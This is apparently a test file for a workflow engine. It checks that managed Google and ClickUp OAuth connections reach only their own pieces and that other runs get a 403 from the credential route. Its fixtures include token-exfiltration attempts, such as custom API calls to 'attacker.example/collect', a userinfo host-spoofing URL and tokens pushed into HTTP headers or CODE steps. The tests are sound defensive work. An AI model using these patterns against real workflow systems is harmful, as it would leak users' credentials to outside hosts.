/**
 * A managed `jarvis:` connection belongs to the pieces of its source. Only a
 * step of one of those pieces may name it, and only as that step's `auth`.
 * Readiness refuses any other reference, and the engine's credential route
 * refuses to hand the credential to a run whose graph holds one, so a graph
 * that never went through readiness cannot reach the token either.
 */

import { afterEach, beforeEach, describe, expect, test } from "bun:test";
import { CredentialResolver } from "../credentials/adapter";
import { JarvisGoogleConnectionSource } from "../credentials/google-source";
import { JarvisClickUpConnectionSource } from "../credentials/clickup-source";
import { mkdtempSync, mkdirSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import type { GoogleAuth } from "../../integrations/google-auth";
import { closeWorkflowDb, DEFAULT_IDS, getWorkflowDb, initWorkflowDb } from "../db";
import { setEncryptionKey } from "../db/encryption";
import { createFlow, setPublishedVersion } from "../db/repos/flow";
import { createDraftVersion, lockVersion, updateDraftVersion } from "../db/repos/flow-version";
import { createFlowRun } from "../db/repos/flow-run";
import { configureWorkflowReadiness, graphReadiness } from "../db/repos/flow-readiness";
import { triggerHookRunId } from "../runner/triggers/hook-run-id";
import { PieceCatalog } from "../runtime/piece-catalog";
import { graphDigest } from "../runtime/continuation";
import { SandboxApi } from "./server";

const ACCESS_TOKEN = "synthetic-managed-google-access-token";
const GMAIL = "@activepieces/piece-gmail";
const HTTP = "@activepieces/piece-http";
const SLACK = "@activepieces/piece-slack";
const CLICKUP = "@activepieces/piece-clickup";

const pieces = new PieceCatalog([
  { name: GMAIL, displayName: "Gmail", description: "", auth: { type: "OAUTH2" }, actions: {
    send_email: { name: "send_email", displayName: "", description: "", inputSchema: { fields: [
      { name: "subject", label: "", type: "string", required: false },
    ] } },
    custom_api_call: { name: "custom_api_call", displayName: "", description: "", inputSchema: { fields: [
      { name: "url", label: "", type: "json", required: false },
      { name: "method", label: "", type: "string", required: false },
    ] } },
  }, triggers: {
    new_email: { name: "new_email", displayName: "", description: "" },
  } },
  { name: HTTP, displayName: "HTTP", description: "", actions: {
    send_request: { name: "send_request", displayName: "", description: "", requireAuth: false, inputSchema: { fields: [
      { name: "headers", label: "", type: "json", required: false },
    ] } },
  } },
  { name: CLICKUP, displayName: "ClickUp", description: "", auth: { type: "OAUTH2" }, actions: {
    create_task: { name: "create_task", displayName: "", description: "", inputSchema: { fields: [
      { name: "name", label: "", type: "string", required: false },
    ] } },
    custom_api_call: { name: "custom_api_call", displayName: "", description: "", inputSchema: { fields: [
      { name: "url", label: "", type: "json", required: false },
      { name: "method", label: "", type: "string", required: false },
    ] } },
  } },
  { name: SLACK, displayName: "Slack", description: "", auth: { type: "OAUTH2" }, actions: {
    send_message: { name: "send_message", displayName: "", description: "" },
  } },
] as any);

const googleAuth = {
  isAuthenticated: () => true,
  reconnectRequired: () => null,
  getAccessToken: async () => ACCESS_TOKEN,
  getTokens: () => ({ access_token: ACCESS_TOKEN, refresh_token: "synthetic-grant", token_type: "Bearer" }),
} as unknown as GoogleAuth;

const empty = (nextAction?: any): any => ({ name: "trigger", type: "EMPTY", ...(nextAction ? { nextAction } : {}) });
const gmail = (input: Record<string, unknown> = { auth: "{{connections.jarvis:google}}" }, nextAction?: any): any => ({
  name: "send", type: "PIECE", settings: { pieceName: GMAIL, actionName: "send_email", input }, ...(nextAction ? { nextAction } : {}),
});
const code = (input: Record<string, unknown>, settings: Record<string, unknown> = {}): any => ({
  name: "calc", type: "CODE", settings: { sourceCode: { code: "export const code = async () => 1", packageJson: "{}" }, input, ...settings },
});
const http = (headers: unknown): any => ({ name: "call", type: "PIECE", settings: { pieceName: HTTP, actionName: "send_request", input: { headers } } });
const slack = (): any => ({ name: "post", type: "PIECE", settings: { pieceName: SLACK, actionName: "send_message", input: { auth: "{{connections.jarvis:google}}" } } });
const customCall = (url: unknown): any => ({ name: "call", type: "PIECE",
  settings: { pieceName: GMAIL, actionName: "custom_api_call", input: { auth: "{{connections.jarvis:google}}", method: "GET", url: { url } } } });
const gmailTrigger = (input: Record<string, unknown> = { auth: "{{connections.jarvis:google}}" }): any => ({ name: "trigger", type: "PIECE_TRIGGER",
  settings: { pieceName: GMAIL, triggerName: "new_email", input } });
const loop = (items: string): any => ({ name: "each", type: "LOOP_ON_ITEMS", settings: { items } });

/** Graphs where something other than a Gmail/Calendar/Drive/Sheets step's auth names the managed Google connection. */
const misuses: Array<[label: string, trigger: any]> = [
  ["a CODE step input", empty(code({ conn: "{{connections.jarvis:google}}" }))],
  ["a CODE step that claims a Google piece name for its auth", empty(code({ auth: "{{connections.jarvis:google}}" }, { pieceName: GMAIL }))],
  ["a CODE step nested input in bracket form", empty(code({ deep: { list: ["{{connections['jarvis:google']}}"] } }))],
  ["an HTTP step header", empty(http({ Authorization: "Bearer {{connections.jarvis:google}}" }))],
  ["the auth of another piece", empty(slack())],
  ["a non-auth input of a Gmail step", empty(gmail({ auth: "{{connections.jarvis:google}}", subject: "{{connections.jarvis:google}}" }))],
  ["a loop's items", empty(loop("{{connections.jarvis:google}}"))],
  ["a Gmail custom API call to another host", empty(customCall("https://attacker.example/collect"))],
  ["a Gmail custom API call to plain http on its own host", empty(customCall("http://gmail.googleapis.com/gmail/v1/users/me/profile"))],
  ["a Gmail custom API call whose host hides behind userinfo", empty(customCall("https://gmail.googleapis.com@attacker.example/x"))],
  ["a Gmail custom API call to another Google host", empty(customCall("https://www.googleapis.com/drive/v3/files"))],
  ["a Gmail custom API call whose URL is an expression", empty(customCall("{{trigger.url}}"))],
  ["a Gmail custom API call whose host is templated", empty(customCall("https://{{trigger.host}}/x"))],
  ["a Gmail custom API call whose host is completed by an expression", empty(customCall("https://gmail.googleapis.com{{trigger.rest}}"))],
  ["a Gmail custom API call whose scheme is completed by an expression", empty(customCall("h{{trigger.rest}}"))],
  ["a Gmail custom API call without a URL", empty(customCall(undefined))],
];

/** Custom API calls that stay on Gmail's own API host. */
const ownHostCalls: Array<[label: string, url: string]> = [
  ["a relative path", "/users/me/profile"],
  ["a templated relative path", "/users/{{trigger.user}}/messages"],
  ["an absolute URL on its own host", "https://gmail.googleapis.com/gmail/v1/users/me/profile"],
  ["an absolute URL on its own host with a templated path", "https://gmail.googleapis.com/gmail/v1/users/{{trigger.user}}"],
];

let api: SandboxApi;
let credentials: CredentialResolver;

beforeEach(async () => {
  initWorkflowDb(":memory:");
  setEncryptionKey(Buffer.alloc(32, 41));
  credentials = new CredentialResolver();
  credentials.register(new JarvisGoogleConnectionSource(googleAuth));
  configureWorkflowReadiness({ pieces, credentials });
  api = new SandboxApi({ services: { credentialResolver: credentials } });
  await api.start({ port: 0 });
});

afterEach(async () => {
  await api?.stop();
  closeWorkflowDb();
  setEncryptionKey(null);
});

const bindingIssues = (trigger: unknown) => {
  const flow = createFlow({});
  return graphReadiness(flow.id, trigger).issues.filter(i => i.code === "CONNECTION_BINDING" || i.code === "REFERENCE_SCOPE");
};

async function fetchFor(runId: string, externalId = "jarvis:google") {
  const identity = { projectId: DEFAULT_IDS.project, sandboxId: crypto.randomUUID(), runId };
  const { token, expiresAt } = await api.signer.mint(identity, 60);
  api.registry.register({ ...identity, engineToken: token, expiresAt, terminatedAt: null });
  return fetch(`${api.baseUrl}/v1/worker/app-connections/${encodeURIComponent(externalId)}?projectId=${DEFAULT_IDS.project}`,
    { headers: { Authorization: `Bearer ${token}` } });
}

function runOf(trigger: any, sampleInputOverride?: Record<string, Record<string, unknown>>): string {
  const flow = createFlow({});
  const version = createDraftVersion({ flowId: flow.id, displayName: "Scope", trigger });
  const run = createFlowRun({ flowId: flow.id, flowVersionId: version.id, status: "RUNNING" });
  // The digest the RUN_FLOW handler records before the engine starts.
  getWorkflowDb().run("UPDATE flow_run SET graph_digest = ? WHERE id = ?", [graphDigest(version.trigger), run.id]);
  if (sampleInputOverride) {
    // The frozen per-run config the worker writes before the engine starts.
    getWorkflowDb().run("UPDATE flow_run SET execution_config = ? WHERE id = ?", [JSON.stringify({ sampleInputOverride }), run.id]);
  }
  return run.id;
}

async function expectRefused(response: Response) {
  expect(response.status).toBe(403);
  expect(await response.text()).not.toContain(ACCESS_TOKEN);
}

describe("readiness: a managed connection is valid only as the auth of its own pieces", () => {
  test("a Gmail step's auth is ready", () => {
    expect(bindingIssues(empty(gmail()))).toEqual([]);
  });

  test("a Gmail trigger's auth is ready", () => {
    const trigger = { name: "trigger", type: "PIECE_TRIGGER", settings: { pieceName: GMAIL, triggerName: "new_email", input: { auth: "{{connections.jarvis:google}}" } } };
    expect(bindingIssues(trigger)).toEqual([]);
  });

  for (const [label, trigger] of misuses) {
    test(`${label} is not ready`, () => {
      expect(bindingIssues(trigger).length).toBeGreaterThan(0);
    });
  }

  for (const [label, url] of ownHostCalls) {
    test(`a Gmail custom API call to ${label} is ready`, () => {
      expect(bindingIssues(empty(customCall(url)))).toEqual([]);
    });
  }

  test("the refusal names the pieces as people know them, and lists the piece names for tooling", () => {
    const [issue] = bindingIssues(empty(slack()));
    expect(issue!.message).toBe("Managed connection jarvis:google can only be used by Gmail, Google Calendar, Google Drive or Google Sheets steps");
    expect(issue!.allowedPieces).toEqual(["@activepieces/piece-gmail", "@activepieces/piece-google-calendar",
      "@activepieces/piece-google-drive", "@activepieces/piece-google-sheets"]);
  });
});

describe("runtime: the engine's credential route checks the run's own graph", () => {
  test("a run whose Gmail step names it as auth gets the token", async () => {
    const response = await fetchFor(runOf(empty(gmail())));
    expect(response.status).toBe(200);
    expect(await response.json()).toMatchObject({ value: { access_token: ACCESS_TOKEN } });
  });

  for (const [label, trigger] of misuses) {
    test(`a run with ${label} referencing it is refused`, async () => {
      await expectRefused(await fetchFor(runOf(trigger)));
    });
  }

  test("a legitimate Gmail step does not cover a CODE step in the same graph", async () => {
    await expectRefused(await fetchFor(runOf(empty(gmail(undefined, code({ token: "{{connections['jarvis:google'].access_token}}" }))))));
    await expectRefused(await fetchFor(runOf(empty(gmail(undefined, code({ token: "{{connections.jarvis:google.access_token}}" }))))));
  });

  test("a sample input override that moves the reference into a CODE step is refused", async () => {
    await expectRefused(await fetchFor(runOf(empty(gmail(undefined, code({}))), { calc: { conn: "{{connections.jarvis:google}}" } })));
  });

  for (const [label, url] of ownHostCalls) {
    test(`a run with a Gmail custom API call to ${label} gets the token`, async () => {
      expect((await fetchFor(runOf(empty(customCall(url))))).status).toBe(200);
    });
  }

  test("a run is checked on the graph it began on: an edited draft, or no recorded graph, is refused", async () => {
    const flow = createFlow({});
    const version = createDraftVersion({ flowId: flow.id, displayName: "Scope", trigger: empty(code({})) });
    const run = createFlowRun({ flowId: flow.id, flowVersionId: version.id, status: "RUNNING" });
    await expectRefused(await fetchFor(run.id));
    getWorkflowDb().run("UPDATE flow_run SET graph_digest = ? WHERE id = ?", [graphDigest(version.trigger), run.id]);
    // The engine was handed a graph with a CODE step; the draft is then
    // edited to a clean Gmail graph while the run is going.
    updateDraftVersion(version.id, { trigger: empty(gmail()) });
    await expectRefused(await fetchFor(run.id));
  });

  test("a run whose graph never names it, or no run at all, is refused", async () => {
    await expectRefused(await fetchFor(runOf(empty(code({})))));
    await expectRefused(await fetchFor(crypto.randomUUID()));
  });

  test("a trigger hook of a flow with a Gmail trigger gets the token; one without is refused", async () => {
    const good = createFlow({});
    const goodVersion = createDraftVersion({ flowId: good.id, displayName: "Hook", trigger: gmailTrigger() });
    expect((await fetchFor(triggerHookRunId("poll", good.id, goodVersion))).status).toBe(200);
    const bad = createFlow({});
    const badVersion = createDraftVersion({ flowId: bad.id, displayName: "Hook", trigger: empty(gmail()) });
    await expectRefused(await fetchFor(triggerHookRunId("poll", bad.id, badVersion)));
  });

  test("a trigger hook is checked on the version it runs, not on another version of the flow", async () => {
    const flow = createFlow({});
    const published = createDraftVersion({ flowId: flow.id, displayName: "Hook", trigger: gmailTrigger({
      auth: "{{connections.jarvis:google}}", label: "{{connections.jarvis:google}}" }) });
    lockVersion(published.id);
    // Published before readiness refused such a trigger (publishing checks
    // readiness now), so set directly.
    getWorkflowDb().run("UPDATE flow SET published_version_id = ? WHERE id = ?", [published.id, flow.id]);
    // An editable draft beside it has a valid Gmail trigger.
    const draft = createDraftVersion({ flowId: flow.id, displayName: "Hook", trigger: gmailTrigger() });
    for (const kind of ["enable", "disable", "poll"] as const) {
      await expectRefused(await fetchFor(triggerHookRunId(kind, flow.id, published)));
      expect((await fetchFor(triggerHookRunId(kind, flow.id, draft))).status).toBe(200);
    }
    // A version of another flow is not one this hook runs.
    const other = createFlow({});
    await expectRefused(await fetchFor(triggerHookRunId("poll", other.id, draft)));
  });

  test("a published trigger that is valid gets the token", async () => {
    const flow = createFlow({});
    const published = createDraftVersion({ flowId: flow.id, displayName: "Hook", trigger: gmailTrigger() });
    lockVersion(published.id);
    setPublishedVersion(flow.id, published.id);
    expect((await fetchFor(triggerHookRunId("poll", flow.id, published))).status).toBe(200);
  });

  test("a trigger hook of a draft whose trigger was edited after the hook began is refused", async () => {
    const flow = createFlow({});
    const misusing = gmailTrigger({ auth: "{{connections.jarvis:google}}", label: "{{connections.jarvis:google}}" });
    const draft = createDraftVersion({ flowId: flow.id, displayName: "Hook", trigger: misusing });
    // The hook was handed the misusing trigger; the draft is then fixed.
    const runId = triggerHookRunId("poll", flow.id, draft);
    updateDraftVersion(draft.id, { trigger: gmailTrigger() });
    await expectRefused(await fetchFor(runId));
  });
});

describe("managed ClickUp is scoped to ClickUp steps", () => {
  const CLICKUP_TOKEN = "synthetic-managed-clickup-access-token";
  const ref = "{{connections.jarvis:clickup}}";
  let dataDir: string;
  beforeEach(() => {
    dataDir = mkdtempSync(join(tmpdir(), "clickup-scope-"));
    mkdirSync(join(dataDir, "connections"));
    writeFileSync(join(dataDir, "connections", "clickup.json"), JSON.stringify({ version: 1, provider: "clickup", status: "connected",
      generation: crypto.randomUUID(), access_token: CLICKUP_TOKEN, account: { id: "7", label: "owner" },
      workspaces: [{ id: "8", name: "Sandbox" }], connected_at: new Date().toISOString() }));
    credentials.register(new JarvisClickUpConnectionSource(dataDir));
  });
  afterEach(() => rmSync(dataDir, { recursive: true, force: true }));
  const task = (input: Record<string, unknown> = { auth: ref }, nextAction?: any): any => ({
    name: "create", type: "PIECE", settings: { pieceName: CLICKUP, actionName: "create_task", input }, ...(nextAction ? { nextAction } : {}),
  });
  const clickUpCall = (url: string): any => ({ name: "call", type: "PIECE",
    settings: { pieceName: CLICKUP, actionName: "custom_api_call", input: { auth: ref, method: "GET", url: { url } } } });
  const refused: Array<[string, any]> = [
    ["a CODE step input", empty(code({ conn: ref }))],
    ["an HTTP step header", empty(http({ Authorization: "Bearer " + ref }))],
    ["a Gmail step auth", empty(gmail({ auth: ref }))],
    ["a ClickUp step next to a CODE step that reads the token", empty(task(undefined, code({ token: "{{connections['jarvis:clickup'].access_token}}" })))],
    ["a ClickUp custom API call to another host", empty(clickUpCall("https://attacker.example/collect"))],
  ];
  for (const [label, trigger] of refused) {
    test(`${label} is not ready and the route refuses it`, async () => {
      expect(bindingIssues(trigger).length).toBeGreaterThan(0);
      const response = await fetchFor(runOf(trigger), "jarvis:clickup");
      expect(response.status).toBe(403);
      expect(await response.text()).not.toContain(CLICKUP_TOKEN);
    });
  }
  test("the refusal names ClickUp", () => {
    const [issue] = bindingIssues(empty(code({ conn: ref })));
    expect(issue!.message).toBe("Managed connection jarvis:clickup can only be used by ClickUp steps");
    expect(issue!.allowedPieces).toEqual([CLICKUP]);
  });
  test("a ClickUp step auth, or a custom API call on api.clickup.com, is ready and resolves", async () => {
    for (const trigger of [empty(task()), empty(clickUpCall("https://api.clickup.com/api/v2/user")), empty(clickUpCall("/user"))]) {
      expect(bindingIssues(trigger)).toEqual([]);
      const response = await fetchFor(runOf(trigger), "jarvis:clickup");
      expect(response.status).toBe(200);
      expect(await response.json()).toMatchObject({ type: "OAUTH2", pieceName: CLICKUP, value: { access_token: CLICKUP_TOKEN } });
    }
  });
});
